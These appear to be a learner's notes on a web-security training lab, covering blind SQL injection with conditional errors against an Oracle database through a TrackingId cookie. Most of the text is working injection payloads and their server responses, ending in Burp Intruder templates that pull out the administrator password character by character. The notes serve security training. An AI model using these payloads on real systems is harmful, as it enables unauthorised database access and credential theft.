Lab #12: Blind SQL injection with conditional errors

Verify that an error message is received. 
Internal Server Error
TrackingId=xyz'

Fixing the query
'--       --{ 200 OK
''        --{200 OK, two single quotes

You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
TrackingId=xyz'||(SELECT '')||'   --{500 Internal Server Error
' || (select '' from dual) ||'    --{200 OK, due to Oracle database requires from


try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
' || (select '' from ddd)||'      --{ 500 Internal Server Error
This behavior strongly suggests that your injection is being processed as a SQL query by the back-end. 

Checking if table users exists
' || (select '' from users where rownum = 1)||'      --{ 200 OK
' || (select '' from userss where rownum = 1)||'     --{ 500 Internal Server Error
Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

 You can also exploit this behavior to test conditions. First, submit the following query: 
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   --{ 500 Internal Server Error
'||(SELECT CASE WHEN (1=11) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  --{ 200 OK


Getting no error. 200 OK
' and (select case when (1=2) then to_char(1/0) else 'a' END from dual)='a

500 internal server error
' and (select case when (1=1) then to_char(1/0) else 'a' END from dual)='a

You can use this behavior to test whether specific entries exist in a table
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'   --{ 500 Internal Server Error
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrators')||'   --{ 200 OK

The next step is to determine how many characters are in the password of the administrator user. 
To do this, change the value to: 
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Use burp intruder to automate
'||(SELECT CASE WHEN length(password)>§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'
The password length is 20. Got '200 OK' at 19

Finding all the characters of the password
Use cluster bomb attack
'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'















